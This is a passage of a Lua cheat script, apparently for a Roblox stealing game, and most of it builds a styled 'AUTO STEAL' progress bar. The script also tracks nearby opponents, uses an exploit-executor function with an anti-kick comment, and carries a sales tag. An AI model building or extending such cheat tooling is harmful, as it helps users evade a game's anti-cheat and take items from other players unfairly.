                    if #tx >= 2 and #tx <= 40 and not tx:lower():find("steal") and not tx:lower():find("prompt") then
                        name = tx
                        break
                    end
                end
                if (d:IsA("Decal") or d:IsA("Texture")) and d.Texture and d.Texture ~= "" then
                    if image == "" then image = d.Texture end
                end
                if d:IsA("MeshPart") and d.TextureID and d.TextureID ~= "" and image == "" then
                    image = d.TextureID
                end
            end
            if name and name ~= "Base" and name ~= "Spawn" then break end
            node = node.Parent
        end
        if (not name or name == "Base" or name == "Spawn") and prompt.Parent then
            local spawn = prompt:FindFirstAncestor("Spawn") or prompt.Parent
            local base = spawn and (spawn.Parent)
            local podium = base and base.Parent
            if podium then
                for _, ch in ipairs(podium:GetChildren()) do
                    if ch:IsA("Model") and ch.Name ~= "Base" then
                        name = ch.Name
                        for _, d in ipairs(ch:GetDescendants()) do
                            if d:IsA("MeshPart") and d.TextureID and d.TextureID ~= "" then
                                image = d.TextureID; break
                            end
                            if (d:IsA("Decal") or d:IsA("Texture")) and d.Texture and d.Texture ~= "" then
                                image = d.Texture; break
                            end
                        end
                        break
                    end
                end
                if not name or name == "" then
                    name = podium.Name
                end
            end
        end
    end
    -- 2) equipped non-bat tool
    if not name then
        local char = LP.Character
        if char then
            for _, obj in ipairs(char:GetChildren()) do
                if obj:IsA("Tool") then
                    local ln = string.lower(obj.Name)
                    if not (ln:find("bat",1,true) or ln:find("slap",1,true) or ln:find("medusa",1,true)) then
                        name = obj.Name
                        if obj.TextureId and obj.TextureId ~= "" then image = obj.TextureId end
                        break
                    end
                end
            end
        end
    end
    if not name then
        local bp = LP:FindFirstChild("Backpack")
        if bp then
            for _, obj in ipairs(bp:GetChildren()) do
                if obj:IsA("Tool") then
                    local ln = string.lower(obj.Name)
                    if not (ln:find("bat",1,true) or ln:find("slap",1,true) or ln:find("medusa",1,true)) then
                        name = obj.Name
                        if obj.TextureId and obj.TextureId ~= "" then image = obj.TextureId end
                        break
                    end
                end
            end
        end
    end
    return name, image
end

function createStealBar()
    _stealBarGeneration = (_stealBarGeneration or 0) + 1
    local myGen = _stealBarGeneration
    local names = {
        "MoveeStealBar","OceanStealBar","R1tualStealBar","R1tualStealBarPreview",
        "OceanStealBarStraight","OceanStealBarVert","OceanStealBarGen","OceanStealBarPremium","OceanStealBarBasic",
    }
    local function wipe(parent)
        if not parent then return end
        for _,n in ipairs(names) do
            local old = parent:FindFirstChild(n)
            if old then pcall(function() old:Destroy() end) end
        end
        for _,ch in ipairs(parent:GetChildren()) do
            if ch:IsA("ScreenGui") and (tostring(ch.Name):find("StealBar") or tostring(ch.Name):find("steal")) then
                pcall(function() ch:Destroy() end)
            end
        end
    end
    -- anti-kick: do not touch CoreGui
    pcall(function() wipe(LP:FindFirstChild("PlayerGui")) end)
    pcall(function() if gethui then wipe(gethui()) end end)
    stealBarFrame = nil

    local style = (type(stealBarStyle)=="number") and math.clamp(math.floor(stealBarStyle), 1, 5) or 1
    local SB_W, SB_H
    if style == 2 then
        SB_W, SB_H = 300, 40
    elseif style == 3 then
        SB_W, SB_H = 300, 96
    elseif style == 4 then
        SB_W, SB_H = 320, 72
    elseif style == 5 then
        -- Basic compact (screenshot style)
        SB_W, SB_H = (UIS and UIS.TouchEnabled) and 200 or 240, 28
    else
        SB_W, SB_H = (UIS and UIS.TouchEnabled) and 280 or 340, 34
    end

    local stealGui=Instance.new("ScreenGui")
    stealGui.Name = (style==2 and "R1tualStealBar") or (style==3 and "OceanStealBarStraight") or (style==4 and "OceanStealBarPremium") or (style==5 and "OceanStealBarBasic") or "OceanStealBar"
    stealGui.ResetOnSpawn=false
    stealGui.IgnoreGuiInset=true
    stealGui.DisplayOrder=100000
    parentGui(stealGui)

    stealBarFrame=Instance.new("Frame",stealGui)
    stealBarFrame.Name="Bar"
    stealBarFrame.Size=UDim2.new(0,SB_W,0,SB_H)
    stealBarFrame.BackgroundColor3=Color3.fromRGB(12,12,12)
    stealBarFrame.BackgroundTransparency = (style == 3) and 0.15 or 0
    stealBarFrame.BorderSizePixel=0
    stealBarFrame.ZIndex=20
    stealBarFrame.ClipsDescendants=true
    stealBarFrame.Visible=true
    stealBarFrame.Active=true
    Instance.new("UICorner",stealBarFrame).CornerRadius=UDim.new(0,(style==2) and 16 or (style==3 and 6 or (style==5 and 10 or 8)))

    if style == 5 then
        stealBarFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
        stealBarFrame.BackgroundTransparency = 0.15
        local st = Instance.new("UIStroke", stealBarFrame)
        st.Color = ACCENT_COLOR
        st.Thickness = 1.2
        st.Transparency = 0.35
        pcall(function() registerAccentHook(function(a) st.Color = a end, stealBarFrame) end)

        local fill = Instance.new("Frame", stealBarFrame)
        fill.Name = "Fill"
        fill.Size = UDim2.new(0, 0, 1, 0)
        fill.BackgroundColor3 = ACCENT_COLOR
        fill.BackgroundTransparency = 0.45
        fill.BorderSizePixel = 0
        fill.ZIndex = 21
        Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 10)
        pcall(function() registerAccentHook(function(a) fill.BackgroundColor3 = a end, fill) end)

        local leftLbl = Instance.new("TextLabel", stealBarFrame)
        leftLbl.BackgroundTransparency = 1
        leftLbl.Size = UDim2.new(0.65, -6, 1, 0)
        leftLbl.Position = UDim2.fromOffset(8, 0)
        leftLbl.Font = Enum.Font.GothamBold
        leftLbl.TextSize = 11
        leftLbl.TextXAlignment = Enum.TextXAlignment.Left
        leftLbl.TextColor3 = Color3.fromRGB(230, 230, 240)
        leftLbl.Text = "AUTO STEAL"
        leftLbl.ZIndex = 25

        local pctLbl = Instance.new("TextLabel", stealBarFrame)
        pctLbl.BackgroundTransparency = 1
        pctLbl.Size = UDim2.new(0.35, -8, 1, 0)
        pctLbl.Position = UDim2.new(0.65, 0, 0, 0)
        pctLbl.Font = Enum.Font.GothamBlack
        pctLbl.TextSize = 11
        pctLbl.TextXAlignment = Enum.TextXAlignment.Right
        pctLbl.TextColor3 = Color3.fromRGB(230, 230, 240)
        pctLbl.Text = "0%"
        pctLbl.ZIndex = 25

        task.spawn(function()
            local displayPct = 0
            local lastT = tick()
            while stealBarFrame and stealBarFrame.Parent and myGen == _stealBarGeneration do
                local now = tick()
                local dt = math.clamp(now - lastT, 0, 0.1)
                lastT = now
                local targetPct = 0
                pcall(function()
                    if Steal and Steal.AutoStealEnabled then
                        if stealMode == "semi" then
                            if SemiSteal and SemiSteal.State and SemiSteal.State.active and SemiSteal.State.startTime then
                                if SemiSteal.State.inRange then
                                    local holdMax = (SemiSteal.CONFIG and SemiSteal.CONFIG.HOLD_MAX) or 2.6
                                    targetPct = math.clamp((now - SemiSteal.State.startTime) / holdMax, 0, 1)
                                end
                            end
                        else
                            local nearPrompt = nil
                            pcall(function() if findNearestPrompt then nearPrompt = findNearestPrompt() end end)
                            if isStealing and stealStartTime and nearPrompt then
                                targetPct = math.clamp((now - stealStartTime) / (Steal.StealDuration or 1.4), 0, 1)
                            end
                        end
                    end
                end)
                local speed = (targetPct < displayPct) and 5 or 14
                displayPct = displayPct + (targetPct - displayPct) * math.clamp(dt * speed, 0, 1)
                if math.abs(displayPct - targetPct) < 0.005 then displayPct = targetPct end
                fill.Size = UDim2.new(math.clamp(displayPct, 0, 1), 0, 1, 0)
                fill.Visible = true
                fill.BackgroundTransparency = 0.35
                pctLbl.Text = string.format("%d%%", math.floor(displayPct * 100 + 0.5))
                if UIS and UIS.TouchEnabled then task.wait(0.04) else task.wait(0.03) end
            end
        end)

        do
            local barDragging, barDragStart, barStartPos = false, nil, nil
            stealBarFrame.InputBegan:Connect(function(input)
                if stealBarPos ~= "CUSTOM" then return end
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    barDragging = true
                    barDragStart = input.Position
                    barStartPos = stealBarFrame.Position
                end
            end)
            UIS.InputChanged:Connect(function(input)
                if not barDragging or stealBarPos ~= "CUSTOM" then return end
                if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
                local d = input.Position - barDragStart
                stealBarFrame.Position = UDim2.new(
                    barStartPos.X.Scale, barStartPos.X.Offset + d.X,
                    barStartPos.Y.Scale, barStartPos.Y.Offset + d.Y
                )
            end)
            UIS.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    if barDragging then
                        barDragging = false
                        local cam = workspace.CurrentCamera
                        local vp = cam and cam.ViewportSize or Vector2.new(1920, 1080)
                        local abs = stealBarFrame.AbsolutePosition
                        local sz = stealBarFrame.AbsoluteSize
                        stealBarCustomX = math.clamp((abs.X + sz.X / 2) / vp.X, 0.05, 0.95)
                        stealBarCustomY = math.clamp(abs.Y / vp.Y, 0.01, 0.95)
                        if saveConfig then pcall(saveConfig) end
                    end
                end
            end)
        end
        if applyStealBarPosition then pcall(applyStealBarPosition) end
        return
    end

    local fillLine=Instance.new("Frame",stealBarFrame)
    fillLine.Name="Fill"
    if style == 3 then
        fillLine.Size=UDim2.new(0,0,1,0)
        fillLine.Position=UDim2.new(0,0,0,0)
    else
        fillLine.Size=UDim2.new(0,0,1,0)
        fillLine.Position=UDim2.new(0,0,0,0)
    end
    fillLine.BackgroundColor3=ACCENT_COLOR
    fillLine.BackgroundTransparency=(style==2) and 0 or (style==3 and 0 or 0.35)
    fillLine.BorderSizePixel=0
    fillLine.ZIndex=21
    Instance.new("UICorner",fillLine).CornerRadius=UDim.new(0,(style==2) and 16 or (style==3 and 4 or 8))
    registerAccentHook(function(a) fillLine.BackgroundColor3=a end, fillLine)
    local fillGrad=Instance.new("UIGradient",fillLine)
    if style == 3 then
        fillGrad.Enabled = false
        fillLine.Visible = false
        fillLine.Size = UDim2.new(0, 0, 0, 0)
    elseif style == 2 then
        -- Original OPT 2 (R1tual)
        fillLine.Visible = true
        fillGrad.Enabled = true
        fillGrad.Color=ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(0.5, ACCENT_COLOR),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(180,180,255)),
        })
        fillGrad.Transparency=NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.15),
            NumberSequenceKeypoint.new(1, 0.35),
        })
        task.spawn(function()
            local tt=0
            local step = (UIS and UIS.TouchEnabled) and 0.08 or 0.04
            while fillGrad and fillGrad.Parent and myGen == _stealBarGeneration do
                tt=tt+step
                fillGrad.Offset=Vector2.new(math.sin(tt*((UIS and UIS.TouchEnabled) and 1.5 or 3))*0.5, 0)
                task.wait((UIS and UIS.TouchEnabled) and 0.08 or 0.04)
            end
        end)
    else
        -- Original OPT 1 (Ocean)
        fillLine.Visible = true
        fillGrad.Enabled = true
        fillGrad.Color=ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(0.45, ACCENT_COLOR),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(180,180,190)),
        })
        fillGrad.Transparency=NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.15),
            NumberSequenceKeypoint.new(1, 0.45),
        })
        task.spawn(function()
            local tt=0
            local step = (UIS and UIS.TouchEnabled) and 0.08 or 0.04
            while fillGrad and fillGrad.Parent and myGen == _stealBarGeneration do
                tt=tt+step
                fillGrad.Offset=Vector2.new(math.sin(tt)*0.2, 0)
                task.wait((UIS and UIS.TouchEnabled) and 0.08 or 0.04)
            end
        end)
    end

    local sbStroke=Instance.new("UIStroke",stealBarFrame)
    if style == 2 then
        sbStroke.Color=Color3.fromRGB(255,255,255)
        sbStroke.Thickness=1.4
        sbStroke.Transparency=0.25
    else
        sbStroke.Color=ACCENT_COLOR
        sbStroke.Thickness=2.5
        sbStroke.Transparency=0.1
        registerAccentHook(function(a) sbStroke.Color=a end, sbStroke)
        local strokeGrad=Instance.new("UIGradient",sbStroke)
        strokeGrad.Color=ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(0.3, ACCENT_COLOR),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(0.7, ACCENT_COLOR),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
        })
        task.spawn(function()
            local t=0
            while strokeGrad and strokeGrad.Parent do
                t=t+0.04
                local p=(math.sin(t)*0.5+0.5)
                strokeGrad.Offset=Vector2.new((p-0.5)*0.8,0)
                task.wait(0.03)
            end
        end)
    end

    local stealLbl, pctLbl, fpsLbl, pingLbl
    if style == 2 then
        -- R1tual layout: STEAL | % | FPS | PING
        stealLbl=Instance.new("TextLabel",stealBarFrame)
        stealLbl.Size=UDim2.new(0.34,0,1,0)
        stealLbl.Position=UDim2.new(0,0,0,0)
        stealLbl.BackgroundTransparency=1
        stealLbl.Font=Enum.Font.GothamBlack
        stealLbl.Text="STEAL"
        stealLbl.TextSize=14
        stealLbl.TextColor3=Color3.fromRGB(245,245,250)
        stealLbl.ZIndex=26

        pctLbl=Instance.new("TextLabel",stealBarFrame)
        pctLbl.Size=UDim2.new(0.28,0,1,0)
        pctLbl.Position=UDim2.new(0.34,0,0,0)
        pctLbl.BackgroundTransparency=1
        pctLbl.Font=Enum.Font.GothamBold
        pctLbl.Text="0%"
        pctLbl.TextSize=14
        pctLbl.TextColor3=ACCENT_COLOR
        pctLbl.ZIndex=26
        registerAccentHook(function(a) if pctLbl and pctLbl.Parent then pctLbl.TextColor3=a end end, pctLbl)

        fpsLbl=Instance.new("TextLabel",stealBarFrame)
        fpsLbl.Size=UDim2.new(0.19,0,1,0)
        fpsLbl.Position=UDim2.new(0.62,0,0,0)
        fpsLbl.BackgroundTransparency=1
        fpsLbl.Font=Enum.Font.Gotham
        fpsLbl.Text="FPS: --"
        fpsLbl.TextSize=11
        fpsLbl.TextColor3=Color3.fromRGB(200,200,210)
        fpsLbl.ZIndex=26

        pingLbl=Instance.new("TextLabel",stealBarFrame)
        pingLbl.Size=UDim2.new(0.19,0,1,0)
        pingLbl.Position=UDim2.new(0.81,0,0,0)
        pingLbl.BackgroundTransparency=1
        pingLbl.Font=Enum.Font.Gotham
        pingLbl.Text="PING: --"
        pingLbl.TextSize=11
        pingLbl.TextColor3=Color3.fromRGB(200,200,210)
        pingLbl.ZIndex=26

        -- Soft shimmer on STEAL text
        local g=Instance.new("UIGradient",stealLbl)
        g.Color=ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(0.4, ACCENT_COLOR),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(0.6, ACCENT_COLOR),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
        })
        registerAccentHook(function(a)
            if g and g.Parent then
                g.Color=ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
                    ColorSequenceKeypoint.new(0.4, a),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
                    ColorSequenceKeypoint.new(0.6, a),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
                })
            end
        end, stealLbl)
        task.spawn(function()
            local t=0
            while g and g.Parent do
                t=t+0.05
                g.Offset=Vector2.new(math.sin(t)*0.35,0)
                task.wait(0.04)
            end
        end)
    elseif style == 4 then
        -- OPT 4 custom: identity + neon steal
        SB_W, SB_H = 350, 78
        SB_W, SB_H = 350, 88
        stealBarFrame.Size = UDim2.fromOffset(SB_W, SB_H)
        stealBarFrame.BackgroundColor3 = Color3.fromRGB(7, 9, 14)
        stealBarFrame.BackgroundTransparency = 0.06
        Instance.new("UICorner", stealBarFrame).CornerRadius = UDim.new(0, 18)
        local glass = Instance.new("UIStroke", stealBarFrame)
        glass.Color = ACCENT_COLOR
        glass.Thickness = 1.5
        glass.Transparency = 0.28
        registerAccentHook(function(a) glass.Color = a end, stealBarFrame)

        fillLine.Visible = false

        -- self avatar (buyer)
        local selfAv = Instance.new("ImageLabel", stealBarFrame)
        selfAv.Size = UDim2.fromOffset(32, 32)
        selfAv.Position = UDim2.fromOffset(10, 10)
        selfAv.BackgroundColor3 = Color3.fromRGB(18,20,28)
        selfAv.BorderSizePixel = 0
        selfAv.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(LP.UserId) .. "&w=150&h=150"
        selfAv.ScaleType = Enum.ScaleType.Crop
        selfAv.ZIndex = 28
        Instance.new("UICorner", selfAv).CornerRadius = UDim.new(0, 9)
        local sAvS = Instance.new("UIStroke", selfAv)
        sAvS.Color = ACCENT_COLOR
        sAvS.Thickness = 1.2
        registerAccentHook(function(a) sAvS.Color = a end, selfAv)

        -- vs / opp avatar
        local oppAv = Instance.new("ImageLabel", stealBarFrame)
        oppAv.Name = "OppAv"
        oppAv.Size = UDim2.fromOffset(32, 32)
        oppAv.Position = UDim2.fromOffset(48, 10)
        oppAv.BackgroundColor3 = Color3.fromRGB(18,20,28)
        oppAv.BorderSizePixel = 0
        oppAv.Image = ""
        oppAv.ScaleType = Enum.ScaleType.Crop
        oppAv.ZIndex = 28
        Instance.new("UICorner", oppAv).CornerRadius = UDim.new(0, 9)

        local buyerTag = Instance.new("TextLabel", stealBarFrame)
        buyerTag.Size = UDim2.fromOffset(70, 14)
        buyerTag.Position = UDim2.new(1, -80, 0, 8)
        buyerTag.BackgroundColor3 = ACCENT_COLOR
        buyerTag.BackgroundTransparency = 0.1
        buyerTag.Font = Enum.Font.GothamBlack
        buyerTag.TextSize = 8
        buyerTag.Text = ".gg/heartless"
        buyerTag.TextColor3 = Color3.fromRGB(12,12,16)
        buyerTag.ZIndex = 29
        Instance.new("UICorner", buyerTag).CornerRadius = UDim.new(0, 5)
        registerAccentHook(function(a) buyerTag.BackgroundColor3 = a end, buyerTag)

        stealLbl = Instance.new("TextLabel", stealBarFrame)
        stealLbl.Size = UDim2.new(0.45, 0, 0, 16)
        stealLbl.Position = UDim2.fromOffset(90, 10)
        stealLbl.BackgroundTransparency = 1
        stealLbl.Font = Enum.Font.GothamBlack
        stealLbl.TextSize = 13
        stealLbl.TextXAlignment = Enum.TextXAlignment.Left
        stealLbl.TextColor3 = Color3.fromRGB(255,255,255)
        stealLbl.Text = "STEAL 0%"
        stealLbl.ZIndex = 28

        local targetLbl = Instance.new("TextLabel", stealBarFrame)
        targetLbl.Size = UDim2.new(0.45, 0, 0, 14)
        targetLbl.Position = UDim2.fromOffset(90, 28)
        targetLbl.BackgroundTransparency = 1
        targetLbl.Font = Enum.Font.GothamBold
        targetLbl.TextSize = 11
        targetLbl.TextXAlignment = Enum.TextXAlignment.Left
        targetLbl.TextColor3 = ACCENT_COLOR
        targetLbl.Text = "target…"
        targetLbl.TextTruncate = Enum.TextTruncate.AtEnd
        targetLbl.ZIndex = 28
        registerAccentHook(function(a) targetLbl.TextColor3 = a end, targetLbl)

        fpsLbl = Instance.new("TextLabel", stealBarFrame)
        fpsLbl.Size = UDim2.fromOffset(70, 28)
        fpsLbl.Position = UDim2.new(1, -78, 0, 24)
        fpsLbl.BackgroundTransparency = 1
        fpsLbl.Font = Enum.Font.GothamBold
        fpsLbl.TextSize = 9
        fpsLbl.TextXAlignment = Enum.TextXAlignment.Right
        fpsLbl.TextColor3 = Color3.fromRGB(150,158,175)
        fpsLbl.Text = "FPS --\nPING --"
        fpsLbl.ZIndex = 28
        pingLbl = fpsLbl

        local track = Instance.new("Frame", stealBarFrame)
        track.Size = UDim2.new(1, -20, 0, 7)
        track.Position = UDim2.fromOffset(10, 58)
        track.BackgroundColor3 = Color3.fromRGB(18,22,30)
        track.BorderSizePixel = 0
        track.ZIndex = 27
        Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
        local neon = Instance.new("Frame", track)
        neon.Size = UDim2.new(0, 0, 1, 0)
        neon.BackgroundColor3 = ACCENT_COLOR
        neon.BorderSizePixel = 0
        neon.ZIndex = 28
        Instance.new("UICorner", neon).CornerRadius = UDim.new(1, 0)
        local tip = Instance.new("Frame", track)
        tip.AnchorPoint = Vector2.new(0.5, 0.5)
        tip.Size = UDim2.fromOffset(9, 9)
        tip.Position = UDim2.new(0, 0, 0.5, 0)
        tip.BackgroundColor3 = Color3.fromRGB(255,255,255)
        tip.BorderSizePixel = 0
        tip.ZIndex = 29
        tip.Visible = false
        Instance.new("UICorner", tip).CornerRadius = UDim.new(1, 0)
        _stealBarOpt4Neon = neon
        _stealBarOpt4Tip = tip
        registerAccentHook(function(a) neon.BackgroundColor3 = a end, neon)

        local oppDisp = Instance.new("TextLabel", stealBarFrame)
        oppDisp.Size = UDim2.new(0.4, 0, 0, 12)
        oppDisp.Position = UDim2.fromOffset(90, 28)
        oppDisp.BackgroundTransparency = 1
        oppDisp.Font = Enum.Font.GothamBold
        oppDisp.TextSize = 10
        oppDisp.TextXAlignment = Enum.TextXAlignment.Left
        oppDisp.TextColor3 = Color3.fromRGB(235,235,245)
        oppDisp.Text = "No opponent"
        oppDisp.TextTruncate = Enum.TextTruncate.AtEnd
        oppDisp.ZIndex = 28

        local oppUser = Instance.new("TextLabel", stealBarFrame)
        oppUser.Size = UDim2.new(0.4, 0, 0, 11)
        oppUser.Position = UDim2.fromOffset(90, 40)
        oppUser.BackgroundTransparency = 1
        oppUser.Font = Enum.Font.Gotham
        oppUser.TextSize = 9
        oppUser.TextXAlignment = Enum.TextXAlignment.Left
        oppUser.TextColor3 = Color3.fromRGB(140,148,165)
        oppUser.Text = "@---"
        oppUser.TextTruncate = Enum.TextTruncate.AtEnd
        oppUser.ZIndex = 28

        stealLbl.Position = UDim2.fromOffset(10, 46)
        stealLbl.Size = UDim2.new(0.45, 0, 0, 12)
        stealLbl.TextSize = 11
        targetLbl.Position = UDim2.fromOffset(90, 10)
        targetLbl.Size = UDim2.new(0.3, 0, 0, 14)

        task.spawn(function()
            while stealBarFrame and stealBarFrame.Parent and myGen == _stealBarGeneration do
                local nm = nil
                pcall(function() nm = select(1, getStealTargetInfo()) end)
                targetLbl.Text = (nm and nm ~= "") and tostring(nm) or "target…"
                local opp = nil
                pcall(function()
                    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                    if not root then return end
                    local best, bd = nil, 1e9
                    for _, plr in ipairs(Players:GetPlayers()) do
                        if plr ~= LP and plr.Character then
                            local r = plr.Character:FindFirstChild("HumanoidRootPart")
                            local h = plr.Character:FindFirstChildOfClass("Humanoid")
                            if r and h and h.Health > 0 then
                                local d = (r.Position - root.Position).Magnitude
                                if d < bd then bd, best = d, plr end
                            end
                        end
                    end
                    opp = best
                end)
                if opp then
                    oppDisp.Text = tostring(opp.DisplayName or opp.Name)
                    oppUser.Text = "@" .. tostring(opp.Name)
                    pcall(function()
                        oppAv.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(opp.UserId) .. "&w=150&h=150"
                    end)
                else
                    oppDisp.Text = "No opponent"
                    oppUser.Text = "@---"
                    oppAv.Image = ""
                end
                task.wait(0.3)
            end
        end)

        elseif style == 3 then
        stealBarFrame.BackgroundColor3 = Color3.fromRGB(10, 12, 16)
        stealBarFrame.BackgroundTransparency = 0.08
        -- Opponent avatar
        local oppAvatar = Instance.new("ImageLabel", stealBarFrame)
        oppAvatar.Name = "OppAvatar"
        oppAvatar.Size = UDim2.fromOffset(30, 30)
        oppAvatar.Position = UDim2.fromOffset(6, 6)
        oppAvatar.BackgroundColor3 = Color3.fromRGB(20, 22, 28)
        oppAvatar.BorderSizePixel = 0
        oppAvatar.Image = ""
        oppAvatar.ScaleType = Enum.ScaleType.Crop
        oppAvatar.ZIndex = 26
        Instance.new("UICorner", oppAvatar).CornerRadius = UDim.new(0, 8)
        local avStroke = Instance.new("UIStroke", oppAvatar)
        avStroke.Color = ACCENT_COLOR
        avStroke.Thickness = 1.2
        avStroke.Transparency = 0.35
        registerAccentHook(function(a) avStroke.Color = a end, oppAvatar)

        local oppDisplay = Instance.new("TextLabel", stealBarFrame)
        oppDisplay.Name = "OppDisplay"
        oppDisplay.Size = UDim2.new(1, -100, 0, 14)
        oppDisplay.Position = UDim2.fromOffset(42, 6)
        oppDisplay.BackgroundTransparency = 1
        oppDisplay.Font = Enum.Font.GothamBold
        oppDisplay.TextSize = 13
        oppDisplay.TextXAlignment = Enum.TextXAlignment.Left
        oppDisplay.TextColor3 = Color3.fromRGB(245, 245, 250)
        oppDisplay.Text = "No opponent"
        oppDisplay.TextTruncate = Enum.TextTruncate.AtEnd
        oppDisplay.ZIndex = 26

        local oppUser = Instance.new("TextLabel", stealBarFrame)
        oppUser.Name = "OppUser"
        oppUser.Size = UDim2.new(1, -100, 0, 12)
        oppUser.Position = UDim2.fromOffset(42, 22)
        oppUser.BackgroundTransparency = 1
        oppUser.Font = Enum.Font.Gotham
        oppUser.TextSize = 11
        oppUser.TextXAlignment = Enum.TextXAlignment.Left
        oppUser.TextColor3 = Color3.fromRGB(150, 155, 170)
        oppUser.Text = "@---"
        oppUser.TextTruncate = Enum.TextTruncate.AtEnd
        oppUser.ZIndex = 26

        -- Brainrot square + name
        local brIcon = Instance.new("ImageLabel", stealBarFrame)
        brIcon.Name = "BrainrotIcon"
        brIcon.Size = UDim2.fromOffset(22, 22)
        brIcon.Position = UDim2.fromOffset(6, 40)
        brIcon.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
        brIcon.BorderSizePixel = 0
        brIcon.Image = ""
        brIcon.ScaleType = Enum.ScaleType.Fit
        brIcon.ZIndex = 26
        Instance.new("UICorner", brIcon).CornerRadius = UDim.new(0, 6)
        local brStroke = Instance.new("UIStroke", brIcon)
        brStroke.Color = Color3.fromRGB(60, 65, 80)
        brStroke.Thickness = 1

        local brName = Instance.new("TextLabel", stealBarFrame)
        brName.Name = "BrainrotName"
        brName.Size = UDim2.new(1, -40, 0, 22)
        brName.Position = UDim2.fromOffset(34, 40)
        brName.BackgroundTransparency = 1
        brName.Font = Enum.Font.GothamBold
        brName.TextSize = 12
        brName.TextXAlignment = Enum.TextXAlignment.Left
        brName.TextYAlignment = Enum.TextYAlignment.Center
        brName.TextColor3 = ACCENT_COLOR
        brName.Text = "No brainrot"
        brName.TextTruncate = Enum.TextTruncate.AtEnd
        brName.ZIndex = 26
        registerAccentHook(function(a) brName.TextColor3 = a end, brName)

        local track = Instance.new("Frame", stealBarFrame)
        track.Name = "Track"
        track.Size = UDim2.new(1, -12, 0, 12)
        track.Position = UDim2.fromOffset(6, 64)
        track.BackgroundTransparency = 1
        track.BorderSizePixel = 0
        track.ZIndex = 25

        local SEG_N = 14
        local segPad = 2
        local segs = {}
        for i = 1, SEG_N do
            local seg = Instance.new("Frame", track)
            seg.Name = "Seg" .. i
            seg.Size = UDim2.new(1 / SEG_N, -segPad, 1, 0)
            seg.Position = UDim2.new((i - 1) / SEG_N, segPad * 0.5, 0, 0)
            seg.BackgroundColor3 = Color3.fromRGB(28, 32, 42)
            seg.BackgroundTransparency = 0.15
            seg.BorderSizePixel = 0
            seg.ZIndex = 26
            Instance.new("UICorner", seg).CornerRadius = UDim.new(0, 3)
            -- slant via gradient
            local sg = Instance.new("UIGradient", seg)
            sg.Rotation = 90
            sg.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0.1),
                NumberSequenceKeypoint.new(1, 0.35),
            })
            segs[i] = seg
        end
        fillLine.Visible = false
        fillLine.Size = UDim2.new(0, 0, 0, 0)
        fillGrad.Enabled = false

        -- tip glow that rides the progress
        local tip = Instance.new("Frame", track)
        tip.Name = "Tip"
        tip.Size = UDim2.new(0, 10, 1, 2)
        tip.Position = UDim2.new(0, 0, 0, -1)
        tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        tip.BorderSizePixel = 0
        tip.ZIndex = 28
        tip.Visible = false
        Instance.new("UICorner", tip).CornerRadius = UDim.new(1, 0)
        local tipStroke = Instance.new("UIStroke", tip)
        tipStroke.Color = ACCENT_COLOR
        tipStroke.Thickness = 1.5
        tipStroke.Transparency = 0.2
        registerAccentHook(function(a)
            tipStroke.Color = a
            for _, seg in ipairs(segs) do
                if seg:GetAttribute("On") then
                    seg.BackgroundColor3 = a
                end
            end
        end, track)

        -- expose for progress loop
        _stealBarOpt3Segs = segs
        _stealBarOpt3Tip = tip
        _stealBarOpt3SegN = SEG_N

        stealLbl=Instance.new("TextLabel",stealBarFrame)
        stealLbl.Size=UDim2.new(0.34,0,0,16)
        stealLbl.Position=UDim2.fromOffset(6, 76)
        stealLbl.BackgroundTransparency=1
        stealLbl.Font=Enum.Font.GothamBlack
        stealLbl.Text="STEAL 0%"
        stealLbl.TextSize=11
        stealLbl.TextXAlignment=Enum.TextXAlignment.Left
        stealLbl.TextColor3=Color3.fromRGB(255,255,255)
        stealLbl.ZIndex=26

        fpsLbl=Instance.new("TextLabel",stealBarFrame)
        fpsLbl.Size=UDim2.new(0.33,0,0,16)
        fpsLbl.Position=UDim2.new(0.34,0,0,76)
        fpsLbl.BackgroundTransparency=1
        fpsLbl.Font=Enum.Font.GothamBold
        fpsLbl.Text="FPS --"
        fpsLbl.TextSize=10
        fpsLbl.TextColor3=Color3.fromRGB(200,200,210)
        fpsLbl.ZIndex=26

        pingLbl=Instance.new("TextLabel",stealBarFrame)
        pingLbl.Size=UDim2.new(0.33,0,0,16)
        pingLbl.Position=UDim2.new(0.67,0,0,76)
        pingLbl.BackgroundTransparency=1
        pingLbl.Font=Enum.Font.GothamBold
        pingLbl.Text="PING --"
        pingLbl.TextSize=10
        pingLbl.TextColor3=Color3.fromRGB(200,200,210)
        pingLbl.ZIndex=26

        -- Live opponent + brainrot updater
        task.spawn(function()
            local function getOpp()
